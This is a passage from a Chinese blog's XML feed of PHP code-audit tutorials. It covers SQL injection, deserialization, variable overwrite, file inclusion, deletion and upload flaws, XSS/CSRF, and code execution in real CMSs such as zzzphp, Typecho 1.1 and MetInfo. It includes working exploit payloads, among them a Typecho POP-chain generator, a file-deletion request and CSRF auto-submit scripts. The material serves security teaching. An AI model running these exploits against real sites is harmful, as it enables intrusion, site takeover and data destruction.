StopAttack($key,$value,$cookiefilter);&#125;unset($_GET[&apos;_SESSION&apos;]);unset($_POST[&apos;_SESSION&apos;]);unset($_COOKIE[&apos;_SESSION&apos;]); 这个正则貌似就是copy的360webscan的那个，这里GET、POST、COOKIE都被过滤了的，但是我们看到其中过滤POST的判断 12345if ($_GET[&quot;p&quot;]!==&apos;admin&apos;)&#123; foreach($_POST as $key=&gt;$value)&#123; StopAttack($key,$value,$postfilter); &#125;&#125; 如果GET传入的p=admin了就不会进入这个if语句，也达到我们绕过的目的了，然后往下面看 12if (!empty($_GET))&#123; foreach($_GET AS $key =&gt; $value) $$key = addslashes_yec($value); &#125;if (!empty($_POST))&#123; foreach($_POST AS $key =&gt; $value) $$key = addslashes_yec($value); &#125; 这里我们传入的P参数的值被重新覆盖掉，然后经过addslashes_yec函数过滤。然后我们梳理一下审计思路 121. 寻找SERVER获取的。2. 寻找数字型注入，结合上面的绕过，注入密码。 先看看前台注入，这个cms注入比较多，我就随便写个了 \inc\module\cart.php 12345678910111213141516171819202122232425262728293031323334353637elseif ($act == &apos;remove_goods&apos;) //移除商品&#123; $ckey = $ckey ? intval($ckey) : intval($_COOKIE[&apos;ckey&apos;]); $gid_list = explode(&quot;@&quot;, $gid); $spec_list = explode(&quot;@&quot;, $spec); $db = dbc(); $where =&apos;&apos;; if($ckey != 0) &#123; $where =&apos; and cid=&apos;.$ckey; &#125; elseif($ym_uid !=0) &#123; $where =&apos; and uid=&apos;.$ym_uid; &#125; else &#123; $res[&apos;err&apos;] = &apos;请刷新页面再试&apos;; die(json_encode_yec($res)); &#125; foreach ($gid_list as $k =&gt; $v) &#123; $sp = $spec_list[$k]; if(intval($v)&lt;=0) &#123; continue; &#125; $db-&gt;query(&quot;delete i FROM &quot;.$db-&gt;table(&apos;cart&apos;).&quot; c join &quot;.$db-&gt;table(&apos;cart_item&apos;).&quot; i on c.id=i.cid where gid=&quot;.$v.&quot; and spec=&apos;&quot;.$sp.&quot;&apos; &quot;.$where); &#125; $cnum = get_cart_amount(1); $res[&apos;res&apos;] = $cnum; $time = time() + 15552000; set_cookie(&apos;cnum&apos;, $cnum, $time); //购物车数量 die(json_encode_yec($res));&#125; 其中传入的$gid经过explode函数分割（这里sql语句中不能使用@字符），然后foreach循环取出来后带入sql语句，也没有单双引号之类的包裹，比较明显的一处注入了。 如果没用绕过是会触发360webscan的 0x02 文末这套程序在1.2.4这里修复了这个逻辑方面的问题貌似漏洞就没啥了。本版本还有很多注入大家可以自己审计一下，也可以看看水泡泡巨佬的https://www.cnblogs.com/r00tuser/p/9014869.html]]></content>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2.0通读全文审计]]></title>
    <url>%2F2019%2F09%2F28%2F2-0%E9%80%9A%E8%AF%BB%E5%85%A8%E6%96%87%E5%AE%A1%E8%AE%A1%2F</url>
    <content type="text"><![CDATA[0x00 简介 通读全文推荐大家开始可以审计一些比较好看懂的CMS，我们先看大体网站框架，这里你大概知道什么文件夹是放什么类型的文件，然后从index.php文件开始往里面读,然后重点关注是否有全局过滤等等。 0x01 实例审计本文用到的源码是zzzphp，我们通过这个程序粗略的了解如何通读全文代码来审计，这里只做简单分析，不深入审计。 了解网站框架12345678910111213├─admin //后台├─config //配置文件├─form //前台├─images //图片├─inc //包含文件├─install //安装文件├─js //js文件├─plugins //插件├─runtime //临时├─search //搜索├─template //模板├─upload //上传文件夹└─wap //手机 首先我们看到这个结构，有一点审计基础或者会点英语应该都能看懂这些目录的意思，当然也有个别程序猿喜欢另类一点的命名规则，大体都是这样。 了解网站过滤与路由我觉得全文通读不是无脑的去挨着读，这样比较浪费时间，我们一般应该先去读他的核心文件，一般都在包含文件夹里面，怎么去找核心文件一般是看文件名比如包含main common等等，也可以看看文件大小一般核心文件包含函数多文件相对较大，还可以通过入口文件一步一步去看，比如这里的核心文件就是zzz_main.php我们无非是先关注参数的获取、是否有全局过滤。 我们来到 \inc\zzz_main.php getlocation() 解析URL getform()获取参数 过滤函数txt_html() 但是通常有关过滤的函数包含一些字符safe之类 或者包含函数 htmlspecialchars() addslashes() 了解系统DB类除了这个文件我们还可以看看mysql db 之类的关键词文件，看看他数据库连接的方式是否存在宽字节注入的可能，还有他的连接方式。 开始审计看完这些我们就可以从index.php一层一层读了。 来到 index.php 直接包含文件inc/zzz_client.php 先判断isinstall 然后执行后面 看到最后一句ParseGlobal(G(&#39;sid&#39;),G(&#39;cid&#39;)); 这里调用了ParseGlobal() 函数我们可以跟进去看看。 进入if分支 12if ( $sid &gt; 0 ) &#123; $data = db_load_one( &apos;sort&apos;, &apos;sid=&apos; . $sid ); 跟进函数db_load_one() 这里会把传入的&amp;替换为and 跟进函数 find_one() 这里我就不详细跟了只介绍思路，基本上确定这里如果传入的参数没过滤那么这里就会存在注入。 这里跟一下 G() 就会发现是$GLOBALS[ &#39;sid&#39; ] 获取的，也就是前面解析url那里获取的值也没有过滤，那么这里基本上就是一个注入了。 读完这些文件我们就可以从各个功能文件夹的index读进去，比如这里我们来到\search\index.php 123&lt;?phpdefine(&apos;LOCATION&apos;, &apos;search&apos;);require dirname(dirname(__FILE__)). &apos;/inc/zzz_client.php&apos;; 还是回到刚刚我们跟进的文件 /inc/zzz_client.php 搜索search关键词然后读源码分析 123case &apos;search&apos;: $tplfile= TPL_DIR . &apos;search.html&apos;; break; 看到选中Search后赋值给了变量$tplfile 然后我们在追踪变量在那个地方被调用过 发现他解析模板的过程，然后跟进ParserTemplate 来到inc\zzz_template.php 然后往下面读发现一个函数getform() getform()函数获取过滤之后还被被 safe_key() 函数过滤，但是看到下面还有函数get_cookie 看样子也是获取参数的，但是这个用到函数isset() 他是一个检测变量的函数，定义了即为true 所以这里根本进不去，不然就是一个注入了,当然这也是一个老版本的注入，我这里的版本已经修复了。接下来还可以从admin的index.php开始读，多关注一些功能点，推荐可以搭建起来熟悉一下整套程序。 0x02 文末通读这个ZZZCMS 我们可以知道，他在调用getform()函数的时候我们基本不考虑注入了，因为已经被过滤了，除非他后面用其他函数处理了一下。在调试复杂语句的时候我们可以通过mysql监控软件来调试。当我们发现一类函数或者写法存在漏洞的时候，可以使用全文搜索，来查找相同的代码对一类进行完整挖掘。]]></content>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[1.9.反序列化审计]]></title>
    <url>%2F2019%2F09%2F28%2F1-9-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AE%A1%E8%AE%A1%2F</url>
    <content type="text"><![CDATA[0x00 简介 PHP反序列化漏洞，在我们使用unserialize()进行反序列化的时候，如果反序列化对象中存在一些我们可以利用的魔法函数且传入的变量可控，那么这个过程就可能触发这个魔法函数，来执行我们想要的过程。 0x01 初识反序列化反序列化我们需要了解php的类和魔术方法，这里举个简单的例子用到的魔术方法是__destruct 销毁一个类之前执行执行析构方法。 当对象创建后输出我们的$a变量的值。那么我们把它的值改变后用serialize()看看 O:4:&quot;test&quot;:1:{s:1:&quot;a&quot;;s:5:&quot;12345&quot;;} 是我们序列化的值，然后unserialize($_GET[&#39;id&#39;]);传入我们改变的值 O:4:&quot;test&quot;:1:{s:1:&quot;a&quot;;s:3:&quot;404&quot;;} 成功打印了我们的改变的值，因为反序列化我们可以控制类属性且这个过程会触发这些能够触发的魔术方法。 这里网上可以找到一些魔术方法,当然还有些可以绕过具体大家搜索一下我这里就不细写了，具体情况具体分析，反序列化难一点的还是需要很大的耐心才能完成。 1234567891011__wakeup() //使用unserialize时触发__sleep() //使用serialize时触发__destruct() //对象被销毁时触发__call() //在对象上下文中调用不可访问的方法时触发__callStatic() //在静态上下文中调用不可访问的方法时触发__get() //用于从不可访问的属性读取数据__set() //用于将数据写入不可访问的属性__isset() //在不可访问的属性上调用isset()或empty()触发__unset() //在不可访问的属性上使用unset()时触发__toString() //把类当作字符串使用时触发__invoke() //当脚本尝试将对象调用为函数时触发 0x02 简单的一道题下面我改了写一道简单的CTF，看看怎么利用它。 12345678910111213141516&lt;?phpclass foo1&#123; public $varr; function __destruct()&#123; $this-&gt;varr-&gt;evaltest(); &#125;&#125;class foo2&#123; public $str; function evaltest()&#123; eval($this-&gt;str); &#125;&#125;?&gt; 我们看到在foo2中evaltest()函数中存在eval，而foo1中调用了函数evaltest()，我们就想可不可以让foo1调用foo2中的evaltest()函数顺边还把它的$str中的值改写了。 123456789101112131415161718&lt;?phpclass foo1&#123; public $varr; function __construct()&#123; $this-&gt;varr = new foo2(); &#125;&#125;class foo2&#123; public $str; function __construct()&#123; $this-&gt;str = &apos;phpinfo();&apos;; &#125;&#125;$obj = new foo1();echo serialize($obj); ?&gt; 我们把$varr变量赋值为new foo2() 然后它再去调用 evaltest()函数 然后我们把$str的值换成 我们想执行的命令。 0x03 实例审计找了半天源码我觉得最有意义的，审计的最多的一次反序列化当属Typecho1.1版本的漏洞了。可能看起来有点吃力我尽量分析的详细一点。 来到文件 install.php 我们看到要绕过install.php这个程序的exit 我们只需要传入的finish值不为空且referer为本站的值就能绕过。 我们来到核心部分 这里调用Typecho_Cookie类的get方法 ，我这里就不跟进去了，就是获取cookies的__typecho_config 字段值，然后base64_decode()在进行反序例化赋值给变量$config,然后我们全局搜索下魔术方法__destruct之类的发现没有可以利用的点. 然后我们跟进这个Typecho_Db类看看，他传入了$config[&#39;adapter&#39;] 和 $config[&#39;prefix&#39;]。 var\Typecho\Db.php 这里使用.连接$adapterName为一个类的话那么会触发__toString()这个魔术方法。 然后全局搜索__toString(),来看看那里可以利，找到\var\Typecho\Feed.php。 如果$item[&#39;author&#39;]是一个类且screenName是一个私有或者未定义的属性那么就会自动触发__get() 那么我们就搜索看看那里有可以利用的__get() 在var\Typecho\Request.php 有这么一处 我把跟进的代码都放在了一块，其中__get 调用了 get()函数，然后它又调用了_applyFilter()函数，其中还有可以造成命令执行的回调函数call_user_func()和array_map() 其中参数还可以控制，那么我的攻击链也算找完了，下面来梳理一下 攻击链： 123456789install.php |绕过程序退出来到unserialize() |db.php中__construct() 触发__toString() |Feed.php中__toString触发__get() |request.php中__get()调用get()-&gt;_applyFilter()-&gt;回调函数 下面来构造exp，为了方便理解我们可以从尾到头来写 首先我们需要_applyFilter中的$filter的值为一个命令函数这里一般选择assert(),然后要让get()中的$value就是我们传入的命令也就是_params[&#39;screenName&#39;]，所以可以构造如下。 123456class Typecho_Request&#123; private $_params = array(&apos;screenName&apos; =&gt;&apos;eval(\&apos;phpinfo();exit();\&apos;)&apos;); private $_filter = array(&apos;assert&apos;); &#125; request.php构造完了再构造Feed.php中需要的值,这里我们要进入$item[&#39;author&#39;]-&gt;screenName这个前面有个self::RSS2 == $this-&gt;_type语句 RSS2= RSS 2.0所以赋值对应的，这里的调用跟我前面写的那个CTF类似。 123456789class Typecho_Feed&#123; private $_type = &apos;RSS 2.0&apos;; private $_items ; public function __construct ()&#123; $this-&gt;_items[] = array(&apos;author&apos; =&gt; new Typecho_Request()); &#125;&#125; 最后回到install.php中 看到$db = new Typecho_Db($config[&#39;adapter&#39;], $config[&#39;prefix&#39;]); 触发db.php中的__construct()需要传入2个值，但是有个是默认的所以我们传入一个我们序列化的上面的值就可以了。 payload : 12345678910111213141516171819202122&lt;?phpclass Typecho_Request&#123; private $_params = array(&apos;screenName&apos; =&gt;&apos;eval(\&apos;phpinfo();exit();\&apos;)&apos;); private $_filter = array(&apos;assert&apos;); &#125;class Typecho_Feed&#123; private $_type = &apos;RSS 2.0&apos;; private $_items ; public function __construct ()&#123; $this-&gt;_items[] = array(&apos;author&apos; =&gt; new Typecho_Request()); &#125;&#125;$payload = array(&apos;adapter&apos;=&gt;new Typecho_Feed());echo base64_encode(serialize($payload));?&gt; 为什么这里payload phpinfo();exit();中有exit() ,因为程序开始使用了ob_start() 这个函数会把输出放进缓冲区，触发异常后ob_end_clean() 会清空缓冲区，导致没有回显。所以可以找到个函数来跳出或者执行后我们报错跳出又或者直接不要回显写入一句话。 这类反序列化一般寻找起来还是很有难度的，个人感觉两头向中间来找方便一些，找到可以利用的入口，再到可以利用的函数，再从入口点想办法到利用点。 0x04 文末反序列化的地方还可以搭配注入 比如espcms的search.php注入。]]></content>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[1.8.变量覆盖审计]]></title>
    <url>%2F2019%2F09%2F28%2F1-8-%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E5%AE%A1%E8%AE%A1%2F</url>
    <content type="text"><![CDATA[0x00 简介 变量覆盖，顾名思义就是可以覆盖已有变量值，导致变量覆盖的漏洞有：extract()、parse_str()、import_request_variables() 使用不当，或者使用了$$或者开启了全局变量注册。 0x01 变量覆盖演示extract() extract(array,extract_rules,prefix)函数从数组中将变量导入到当前的符号表，即将数组中的键值对注册成函数，使用数组键名作为变量名，使用数组键值作为变量值。 可以看到我们初始变量值为a但是覆盖之后就变成了我们输入的值。 parse_str() parse_str()函数用于把查询字符串解析到变量中，如果没有array 参数，则由该函数设置的变量将覆盖已存在的同名变量。在没有array参数的情况下使用此函数，并且在PHP 7.2中将废弃不设置参数的行为,此函数没有返回值。 import_request_variables() import_request_variables ( string $types , string $prefix )将 GET／POST／Cookie 变量导入到全局作用域中, types 参数指定需要导入的变量, G代表GET，P代表POST，C代表COOKIE。此函数只能用于PHP4.1 ~ PHP5.4。 $$ 典型的例子就是foreach来遍历数组中的值作为变量。 其中$_key的值为a,那么 $a的值就被覆盖为2了。 还有全局注册register_globals这些，php配置默认都是关闭的。 0x02 实战审计本次用到的是MetInfo cms的变量覆盖漏洞，跟进主页来到核心配置文件 \include\common.inc.php 看到文件的24~28行，明显用到了我们上面说的&amp;&amp;变量覆盖的写法，不过这里他用到了daddslashes()防注入，不过并不影响我们这章讲的知识。 随便来到一个子文件看看他的加载方式\news\index.php 第7行包含一个变量，那么这个变量在什么地方，我们跟进 include/module.php 看看，在本文件搜索$module变量。 这里其实低版本的源码中没有这句话$module = &#39;&#39;; 其中$module变量都在$fmodule != 7 这个if条件中，我给大家打包的是低版本，我安装错了。 也就是只要我们传入的$fmodule的值为7那么我们就可以覆盖这个$module的值 只要上传一张图片或者其他文件就可以包含了，因为require_once的时候并没有判断他的后缀名。 在变量覆盖的时候一定要注意初始化的值和覆盖的顺序。]]></content>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[1.7.函数或弱类型的缺陷和特性]]></title>
    <url>%2F2019%2F09%2F28%2F1-7-%E5%87%BD%E6%95%B0%E6%88%96%E5%BC%B1%E7%B1%BB%E5%9E%8B%E7%9A%84%E7%BC%BA%E9%99%B7%E5%92%8C%E7%89%B9%E6%80%A7%2F</url>
    <content type="text"><![CDATA[0x00 in_array() in_array(search,array,type) 如果给定的值 search 存在于数组 array 中则返回 true。如果第三个参数设置为 true，函数只有在元素存在于数组中且数据类型与给定值相同时才返回 true。如果没有在数组中找到参数，函数返回 false。 那么为什么会出现安全问题呢，我们来看看下面代码 在没设置第三个参数的情况下in_array()函数将会吧1 and 1=1转为数字1比较，那么这样就造成了一些安全问题，在注入或上传的情况下可能绕过。 0x01 is_number()is_number() 函数他会判断变量是否为数字或者数字字符串，假如我们传入的字符串为16进制，那么他也是认定为数字的。 我们知道我们向mysql插入数据的时候是可以是16进制的，他取出来就会还原成原始字符串，这样用is_number() 函数检测后肯能就会存在二次注入。 0x02 PHP弱类型的特性php是一款弱类型语言，他在使用==比较字符串的时候会把字符串类型转化成相同的再比较，那么这样也会造成一些问题. 他能遇到字符串的0e,0x就会解析成对应的科学计数和16进制。 0x03 switch()case是数字类型时，switch会把参数转换为int类型 0x04 strcmp()比较函数如果两者相等返回0，string1&gt;string2返回&gt;0 反之小于0。在5.3及以后的php版本中，当strcmp()括号内是一个数组与字符串比较时，也会返回0。 0x05 preg_match()如果在进行正则表达式匹配的时候，没有限制字符串的开始和结束(^ 和 $)，则可以存在绕过的问题。 0x06 文末当然还有反序列化、变量覆盖等等，这里就不全部写了，我会单独拿出来写，还有一些函数的特性留给大家自行搜索。]]></content>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[1.6.逻辑漏洞审计]]></title>
    <url>%2F2019%2F09%2F28%2F1-6-%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E5%AE%A1%E8%AE%A1%2F</url>
    <content type="text"><![CDATA[0x00 简介 逻辑漏洞是指由于程序逻辑不严，或者函数使用不当，导致发生越权访问，cookies绕过，越权密码修改，重复安装等等问题。一般逻辑漏洞的挖掘需要对代码有一定阅读能力。 0x01 越权越权一般是对cookies的验证不严或者没有验证，一般我们审计后台发现某个功能没有包含验证文件，那么很有可能发生越权操作，当然越权有很多不仅仅局限于一个后台访问的问题。在众多大型网站越权问题也时常发生的，这也是漏洞挖掘中大家都比较喜欢的，有些越权在黑盒测试中或许更加容易发现，所以代码审计大家灵活运用，不要局限了你的思路。越权是个大的专题，我应该是讲不了多少还是请大家多看看文章。 1.后台越权：后台某些页面没有引入验证文件 比如这里熊海cms如果我们删除这个验证，那么就可以直接访问这个页面，有很多程序员他会忘记每个页面都添加。 2.水平越权：一个用户尝试访问与他拥有相同权限的用户的资源，比如删除收获地址处没有验证权限,导致越权删除其他人的地址。 我们用zzzcms这个程序来做演示 zzzcms\form\index.php 他这里是edituser是没有越权的，我这里只是讲解一下，简单的介绍一下越权如何去审计。我们看这个代码他最后update的时候是修改我们的uid现对的值，而我们的uid是POST包获取的，也就是如果我们可控uid那么就能越权修改其他人的资料。但是这里有一条验证$uid != get_session( &#39;uid&#39; )and back( &#39;很抱歉，资料修改失败&#39; ); 所以没办法越权，为了演示我们可以删除了来看看。 成功把UID为1的用户的资料修改了。 3.垂直越权：一个低级用户尝试访问高级别用户的功能。 0x02 cookies验证不严这里用到熊海CMS，我们随便点击一个后台页面，前面包含了一个验证文件require &#39;../inc/checklogin.php&#39;; 来看看这个文件 判断我们的cookies里面user是否为空，不为空就可以访问后台了。 0x03 安装程序逻辑问题这里找了半天源码发现红日安全写过一个Simple-Log1.6这里就用他这个源码了。 这里他判断是否安装了,然后就直接跳转到主页，而程序没有退出，那么后面的依然可以执行，也就是说直接post后面的程序即可安装。 这类没有正确退出的造成的漏洞还是蛮多的，在后台等地方可以好好关注一下。 0x04 文末当然逻辑漏洞不止就这些，还有其他的问题比如验证码逻辑的绕过，函数的缺陷，推荐大家多看看别人的审计文章。]]></content>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[1.5.文件操作审计]]></title>
    <url>%2F2019%2F09%2F28%2F1-5-%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E5%AE%A1%E8%AE%A1%2F</url>
    <content type="text"><![CDATA[0x00 文件包含 本地包含本地文件包含（Local File Include）简称 LFI，文件包含在php中，一般涉及到的危险函数有include()、include_once()、require()、require_once()，在包含文件名中存在可控变量的话就可能存在包含漏洞，由于这几个函数的特性也可能产生其他漏洞，后面一一讲到。 示例： 1234&lt;?php $file = $_GET[&apos;name&apos;]; include($file);?&gt; payload: 1http://127.0.0.1/test.php?name=D:\phpstudy\PHPTutorial\MySQL\my.ini 这是个最简单的文件包含，没有任何过滤。但是一般程序不会这么写，一般会指定后缀，这样我们就需要截断来绕过了。 1234&lt;?php $file = $_GET[&apos;name&apos;]; include($file . &quot;html&quot;);?&gt; 在PHP5.2.x中我们可以通过使用%00来截断后面的内容、也可以使用路径长度截断，不过都在php5.3中被修复了。 payload： 1http://127.0.0.1/test.php?name=D:\phpstudy\PHPTutorial\MySQL\my.ini%00 利用字符.或者/.或者./来截断。系统文件路径长度限制：windows 259个byteslinux 4096个bytes。 远程包含远程文件包含漏洞(Remote File Inclusion)简称RFI，他需要我们的php.ini中配置allow_url_include、 allow_url_fopen。 1.包含远程文件 需要打开allow_url_include=On、 allow_url_fopen = On 他可以利用?号截断，不受版本限制 payload： 1http://127.0.0.1/test.php?name=http://127.0.0.1/1.txt? 2.伪协议 123456789101112file:// — 访问本地文件系统http:// — 访问 HTTP(s) 网址ftp:// — 访问 FTP(s) URLsphp:// — 访问各个输入/输出流（I/O streams）zlib:// — 压缩流data:// — 数据（RFC 2397）glob:// — 查找匹配的文件路径模式phar:// — PHP 归档ssh2:// — Secure Shell 2rar:// — RARogg:// — 音频流expect:// — 处理交互式的流 各种伪协议的使用方法网上很多，大家搜索一下吧。 实战审计直接看主页index.php 1234567&lt;?php//单一入口模式error_reporting(0); //关闭错误显示$file=addslashes($_GET[&apos;r&apos;]); //接收文件名$action=$file==&apos;&apos;?&apos;index&apos;:$file; //判断为空或者等于indexinclude(&apos;files/&apos;.$action.&apos;.php&apos;); //载入相应文件?&gt; 他会包含files目录下的文件，因为他没有过滤../所以可以包含任意目录下的文件，由于加了后缀所以漏洞存在于低版本php。 0x01 任意文件删除任意文件删除审计一般来说我们都是搜索函数unlink 然后回溯去看。 inc\zzz_file.php 首先判断传入的参数是否为空，然后拼接路径，第516行中出现了一个函数ifstrin,我们跟进看看 只是个简单的判断没啥特殊情况，我们再来看看拿来调用了这个文件。 1234567891011121314function file_path( $path ) &#123; $list=array(); $path= substr( $path, 0, strrpos( $path, &apos;/&apos; )); $list=splits($path,&apos;/&apos;); return $list;&#125;function arr_search($arr1, $arr2 ) &#123; $result=false; foreach ( $arr1 as $v ) &#123; if(in_array( $v,$arr2 )) return true; &#125; return $result;&#125; 获取参数，然后看看我们传入的路径是否存在这个数组里面的值，也就是基本上是没有过滤的，因为我们完全可以通过../ 跳回去。 payload： 123POST /zzzp6p/admin/save.php?act=delfilepath=/zzzp6p/upload/../install/1install.lock 这里我们走的下面的分支不能删除 array( &#39;php&#39;, &#39;db&#39;, &#39;mdb&#39;, &#39;tpl&#39; ) 这个数组的文件。 要删除任意文件只需要使用 1path=/zzzp6p/runtime/../install/1.db 让ifstrin()为true走上面的分支即可。 一般来说我们任意文件删除 是配合删除install.lock来达到网站重装漏洞。 0x02 任意文件下载任意文件下载常见于文件的显示和下载的地方，一般关注的文件是和下载有关的，比如download。当然你还可以搭建源码，来寻找能够下载的地方。 常见的下载或读取函数: file_get_contents()、readfile() 、fopen() 在网上找到个别人审计的实例，结合起来审计一下，用到的源码是Ear_Music_20180820_UTF8 搜索down相关的词语，找到文件\template\default\source\down.php 我们看看$file参数怎么来的,先是调用函数getfield(),转到函数去看看 不出意外应该是从数据库中读取路径，再来看看geturl()函数 构造下载地址，这些地方没什么问题，我们来看看什么地方对储存地址的表中插入了数据，搜索表名lyric。 \source\user\music\ajax.php 我们看到$lyric经过 checkrename、 SafeRequest这两个函数的清洗，先来转到函数SafeRequest。 我们传入的mode是get，然后经过addslashes()的转义，下面在替换为空，也就是我们基本上是不能使用\\了，我们在看看checkrename 这里正则匹配了我们的 123.\ ?iframe=.php? 这里完全看不懂他匹配后缀为php?这个的意义何在，直接php就绕过了。 所以综合起来就是不要带有\ 和 ./ 这里我们只要传入绝对路径就可以了 登陆前台找到上传歌曲的页面在歌词地址中插入payload payload： 1D:/phpstudy/PHPTutorial/WWW/Ear_Music/template/default/source/down.php 0x03 文件上传文件上传只有一个函数 move_uploaded_file() 一般来说，我们就可以搜索这个函数来回溯，看他的验证方式，是黑名单还是白名单，是否是前端限制，是否只是简单的验证了文件头，是否是能绕过的正则匹配，是否渲染了图片。 结合zzzphp来审计一下文件上传，全局搜索move_uploaded_file \zzzcms\inc\zzz_file.php 回溯看看那里调用了这个函数 典型的黑名单验证，可以使用asa绕过，只需要在后台添加这个扩展名 上传即可，当然也可以通过上图中的 switch分支，只要传入的 type不是他的类型就可以跳过后台添加这个步骤， 0x04 文末对文件的操作还见于写入其他配置文件，典型的有thinkphp缓存文件写入。]]></content>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[1.4.XSS与CSRF审计]]></title>
    <url>%2F2019%2F09%2F28%2F1-4-XSS%E4%B8%8ECSRF%E5%AE%A1%E8%AE%A1%2F</url>
    <content type="text"><![CDATA[0x00 XSS简介 XSS分为反射型和储存型，一般来说反射型的用处不是很大利用难度相对较高，存储型XSS一般常见于发布评论、留言、收获地址、个人信息等等。对于xss的审计我们一般就在这些点找，有用户控制输入信息输出的地方都是它出现的地方，很多网站的突破口可能就是一个XSS。 0x01 XSS实战审计这次选用的CMS还是熊海，我们通过搭建环境查看输入的地方来审计，学习下高效率审计方式。 随意留言抓包看看他请求的url再去找相对的文件/?r=submit&amp;type=message 当然你还是得看看他是怎么调用文件的，这里就是加载submit文件中的message方法。 我们来到 files/submit.php 前面的输入基本都没过过滤，到了最后一步$content被 addslashes(strip_tags($content));过滤，所以我们XSS其他地方即可，看到这里我们在挖洞的过程中所以不要纠结一点。 一般过滤xss的函数还有htmlspecialchars，我们审计他的注意点就是查看一些输出函数print、print_r、echo、printf、die、var_dump、var_export。 0x02 CsrfCSRF（Cross-site request forgery），中文名称：跨站请求伪造，也被称为：one click attack/session riding，缩写为：CSRF/XSRF。CSRF实际上就是利用你的身份去发送恶意请求，我们需要知道CSRF分为GET型提交的和POST，前者危害更大，后者一般可以寻找XSS来配合我们。GET型的比如一个链接 http://www.404.com/1.php?id=1 访问即可删除账号，然后你在论坛发帖构造&lt;img src=&quot;http://www.404.com/1.php?id=1&quot;&gt; 那么访问这个帖子的人账号都将会删除，POST的见下文，造成CSRF的原因就是没有使用token或者验证其他值，审计就看页面有没有token、referer验证，验证是否可以绕过，不过我推荐还是先黑盒，看看有没有token，删除了referer是否能够访问，再结合代码来看。 我们来看到zzzphp的后台，他是没有token的，同时我们前面审计到了他的代码执行，配合这个csrf就可以直接getshell。 如果你不会自己写这个代码，不妨使用burp生成一个测试页面，右键选择即可。 这是个需要点击的表单,你可以加一段JavaScript代码来自动提交。 1&lt;script&gt; document.forms[0].submit(); &lt;/script&gt; 0x03 组合利用这里只是个简单的组合，由于没找到具体实验环境我只有简单的演示一下(懒)本次选妃zzzphp，由于他后台没有的xss，我只能登陆后台后查看前台了。 1.构造CSRF表单自动提交payload： 12345678&lt;html&gt; &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt; &lt;body&gt; //burp生成的表单 &lt;script&gt; document.forms[0].submit(); &lt;/script&gt; &lt;/body&gt;&lt;/html&gt; 2.插入iframe标签 payload： 1&lt;iframe src=&quot;http://404.com/zzzp6p/1.html&quot; /&gt; 还可以使用XMLHTTPRequest发送POST、GET，按情况选择，这里把payload插入手机号码。 用登陆了后台后访问页面，可以看到显示修改成功。 由于没找到想要的源码我简单介绍下利用XMLHTTPRequest来发包,漏洞程序还是熊海cms删除一友情链接 payload 1.js： 123456function del() &#123; var xhr = new XMLHttpRequest(); xhr.open(&apos;GET&apos;,&apos;/xiong/admin/?r=linklist&amp;delete=6&apos;); xhr.send(null); &#125;del(); payload： 1&lt;script src=&quot;http://404.com/xiong/1.js&quot;&gt;&lt;/script&gt; 查看留言板可以看到我们的XMLHTTPRequest已经发包了 比较典型的例子可以看看 https://xz.aliyun.com/t/3177]]></content>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[1.3.代码执行审计]]></title>
    <url>%2F2019%2F09%2F28%2F1-3-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%AE%A1%E8%AE%A1%2F</url>
    <content type="text"><![CDATA[0x00 简介 代码执行也是我们经常遇到的，通常是eval()、assert()，当然还有回调函数比如call_user_func() array_map()，正则函数，动态调用等等，因为程序对传入的参数过滤不严或者没有过滤，导致代码执行，看过我前面写的php的webshell总结的话，你就会发现很多知识是相辅相成的。 0x01 代码执行这里说说eval的命令执行，assert在php7后面移除了。我们来看一个简单的eval代码执行 test.php 1234&lt;?$id = $_GET[&apos;x&apos;];eval($id);?&gt; payload: 1test.php?x=phpinfo(); 简单到waf以为他是个webshell了，当然我们实际情况肯定遇不到这么简单的，可能需要多重组合利用，这里下面我以一个实例为例 0x02 实战审计这里使用的是zzzphp V1.6.0的一个解析标签过程中引发的代码执行，网上也有其他人的审计思路，这里我是帮朋友复现的时候弄的。 找个的审计思路是全局搜索eval，当然你也可以搜索其他的能够引发代码执行的函数，但是这个这-1里没有。 路径：\inc\zzz_template.php 我们发现eval里面有变量，那么他是可能存在代码执行的 大概看了下parserIfLabel() 函数没有什么过滤，能够达到我们传入任意参数的目的，到了这里我们就是回溯那里调用了这个函数呗，全局搜索下parserIfLabel()，没搜索到，看了下是个类，所以搜索类名ParserTemplate。 既然 \admin\save.php 调用了我们这个，不妨看看后台那里有模板操作这个 当然完全你也可以回溯代码去分析，但是既然有源码能看就看。 随便找个文件放入我们遵循他正则的代码即可，不过一般我们测试的过程中，尽量选择对目标影响小的文件。 payload： 1&#123;if:assert(phpinfo())&#125;x&#123;end if&#125; 于此同类的还有苹果cms8.x，都是在解析标签过程中出现的问题，一般看到可以自定义解析标签那么就值得注意，命令执行与此类似，这里就不说了。]]></content>
  </entry>
  <entry>
    <title><![CDATA[1.2.SQL注入审计]]></title>
    <url>%2F2019%2F09%2F28%2F1-2-SQL%E6%B3%A8%E5%85%A5%E5%AE%A1%E8%AE%A1%2F</url>
